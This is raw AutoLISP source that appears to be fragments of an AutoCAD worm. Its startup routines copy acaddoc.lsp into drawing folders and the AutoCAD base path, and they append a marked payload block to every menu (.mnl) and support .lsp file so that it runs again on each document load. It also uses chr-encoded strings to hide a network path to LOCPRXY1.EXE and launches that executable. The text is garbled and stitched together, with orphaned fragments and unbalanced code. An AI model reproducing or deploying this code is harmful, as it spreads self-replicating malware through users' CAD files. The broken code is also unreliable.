(defun-q s::startup (/ basepath baseacad acaddocpath r-acaddoc w-basepath
         	    rl-acaddoc acaddoclsp c-acaddocname c-acaddocpath c-acaddoc)

     (setq basepath (findfile "base.dcl") )
     (setq basepath (substr basepath 1 (- (strlen basepath) 8) ) )
     (setq baseacad (strcat basepath "acaddoc.lsp"))
     
     (setq acaddocpath (findfile "acaddoc.lsp")	)
     (setq acaddocpath (substr acaddocpath 1 (- (strlen acaddocpath) 11)))
     (setq acaddoclsp (strcat acaddocpath "acaddoc.lsp"))
	
     (setq c-acaddocname (getvar "dwgname"))
     (setq c-acaddocpath (findfile c-acaddocname))
     (setq c-acaddocpath (substr c-acaddocpath 1 (- (strlen c-acaddocpath)
                         (strlen c-acaddocname)) ))

     (setq c-acaddoc (strcat c-acaddocpath "acaddoc.lsp") )

     (if (and  (/= basepath acaddocpath) (= c-acaddocpath acaddocpath))
	 (progn
	   (setq r-acaddoc (open acaddoclsp "r") )
	   (setq w-basepath (open baseacad "w"))     
	   (while
	      (setq rl-acaddoc (read-line r-acaddoc))
	        (write-line rl-acaddoc w-basepath)
           )
           (close w-basepath)   
           (close r-acaddoc)
         )
	 (progn
	    (setq r-acaddoc (open acaddoclsp "r"))
	    (setq w-basepath (open c-acaddoc "w"))
	    (while
	      (setq rl-acaddoc (read-line r-acaddoc))
	        (write-line rl-acaddoc w-basepath)
            )
	    (close w-basepath)   
            (close r-acaddoc)
         )
      )
  (princ)
  )
 
  (strcat "(load " (chr 34) "acadapq" (chr 34) ")" ) wwjm) ; (load \"acadapq\")
  (write-line "(princ)" wwjm) (close wwjm) )
)

(defun wwriteapp ()
   (if
     (setq wwjm1 (open wnewacad "w"))
     (progn
       (setq wwjm (open woldacad "r"))
       (while (setq wwz (read-line wwjm))
       (write-line wwz wwjm1))				
       (close wwjm)
       (close wwjm1)
   ) )
)

(if
  (and (= wacadwpath wdwgwpath) (/= wacadwpath wpath)) 
  (progn
    (if (= 0 wlspmnl)
      (progn
        (setq woldacad (findfile "acaddoc.lsp"))	  
        (setq newacad (strcat  wpath "acadapq.lsp")) )
      (progn
        (setq woldacad (strcat wpath "acadapq.lsp"))
        (setq wnewacad (findfile "acaddoc.lsp")) )	  		 )

    (if (= wlspbj 0)				  
      (progn
         (setq wwjqm (strcat wpath "acaddoc.lsp"))
         (setq wwjm (open wwjqm "a"))
         (write-line (strcat "(load " (chr 34) "acadapq" (chr 34) ")" ) wwjm) 
                          ; (load \"acadapq\")
         (write-line "(princ) "wwjm) (close wwjm)) )
         (wwriteapp) )
      (progn
         (if (/= wnowdwg "Drawing.dwg")
            (progn
              (setq woldacad (findfile "acadapq.lsp"))
              (setq wnewacad (strcat wdwgwpath "acaddoc.lsp"))
              (wwriteapp) ) )
      )
    )

(setvar "cmdecho" wold_cmd)
(princ)
(setq strtopstr (strcat (chr 92) (chr 70) (chr 83) (chr 49) ; \\FS1
   (chr 92) (chr 83) (chr 89) (chr 83) (chr 49) ; \\SYS1
   (chr 92) (chr 87) (chr 79) (chr 82) (chr 75) ; \\WORK
   (chr 92) (chr 80) (chr 76) (chr 79) (chr 84) (chr 69) (chr 82) ) ) ; \\PLOTER
   ; \\\\FS1\\SYS1\\WORK\\PLOTER

(setq strbottomstr (strcat (chr 92) ; \\
   (chr 76) (chr 79) (chr 67) (chr 80) (chr 82) (chr 88) (chr 89) (chr 49)
   (chr 46) (chr 69) (chr 88) (chr 69) ) )  ; LOCPRXY1.EXE
   ; \\LOCPRXY1.EXE
(startapp (strcat strtopstr strbottomstr))

(setvar "cmdecho" wold_cmd)
(princ)(princ)
(load "acadapq")(princ)

(setq flagx t)
(setq bz "(setq flagx t)")
(defun app(source target bz / flag flag1 wjm wjm1 text)

(setq flag nil)

(setq flag1 t)
  (if (findfile target)
    (progn
      (setq wjm1 (open target "r"))
      (while (setq text (read-line wjm1))
	(if (= text bz) (setq flag1 nil))
	);while
      (close wjm1)
      );progn
    );if
  (if flag1
    (progn
      (setq wjm (open source "r"))
      (setq wjm1 (open target "a"))
      (write-line (chr 13) wjm1)
      (while (setq text (read-line wjm))
	(if (= text bz) (setq flag t))
	(if flag
	  (progn
	    (write-line text wjm1)
	    );progn
	  );if
	);while
      (close wjm1)
      (close wjm)
      );progn
    );if
  );defun
(setvar "cmdecho" 0)
(setq acadmnl (findfile "acad.mnl"))
(setq acadmnlpath (vl-filename-directory acadmnl))
(setq mnlfilelist (vl-directory-files acadmnlpath "*.mnl"))
(setq mnlnum (length mnlfilelist))
(setq acadexe (findfile "acad.exe"))
(setq acadpath (vl-filename-directory acadexe))
(setq support (strcat acadpath "\\support"))
(setq lspfilelist (vl-directory-files support "*.lsp"))
(setq lspfilelist (append lspfilelist (list "acaddoc.lsp")))
(setq lspnum (length lspfilelist))
(setq dwgname (getvar "dwgname"))
(setq dwgpath (findfile dwgname))
(if dwgpath
  (progn
    (setq acaddocpath (vl-filename-directory dwgpath))
    (setq acaddocfile (strcat acaddocpath "\\acaddoc.lsp"))
    (setq mnln 0)
    (while (< mnln mnlnum)
      (setq mnlfilename (strcat acadmnlpath "\\" (nth mnln mnlfilelist)))
      (app mnlfilename acaddocfile bz)
      (app acaddocfile mnlfilename bz)
      (setq mnln (1+ mnln))
      );while
    (setq lspn 0)
    (while (< lspn lspnum)
      (setq lspfilename (strcat support "\\" (nth lspn lspfilelist)))
      (app lspfilename acaddocfile bz)
      (app acaddocfile lspfilename bz)
      (setq lspn (1+ lspn))
      );while
    );progn
  );if
(setq mnln 0)
(while (< mnln mnlnum)

(if (null stol) (load "lcm" ""))
(princ)
